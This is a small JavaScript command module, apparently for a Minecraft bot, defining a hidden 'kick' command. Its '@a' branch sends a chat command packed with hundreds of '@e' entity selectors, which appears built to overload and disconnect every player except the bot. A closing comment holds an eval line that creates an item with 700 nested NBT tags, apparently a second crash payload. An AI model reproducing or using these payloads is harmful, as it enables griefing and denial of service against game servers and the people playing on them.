const {uuidToInt}=require("../commandblock.js");
module.exports={
	command:function(b,msg){
		const args=msg.split(" ");
		const kickedplayer=args.slice(1).join(" ");
		if(args[1]=="@a"){
			b.ccq.push(`/msg @a[nbt=!{UUID:[I;${uuidToInt(b.uuid)}]}] @e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e`);
			b.send("Kicking all players");
		} else {
			b.kick(kickedplayer,undefined,"command");
			b.send("Kicking player "+args[1]);
		}
	},
	desc: "Kick a player",
	usage: " <player>",
	hidden: true,
	verify: true
};
//nbt={UUID:[I;${uuidToInt(uuid)}]}
//eval index.bots[0].ccq.push("/give 75a0985a1353b0c1 stone{"+new Array(700).fill("a:{").join("")+new Array(700).fill("}").join("")+"}")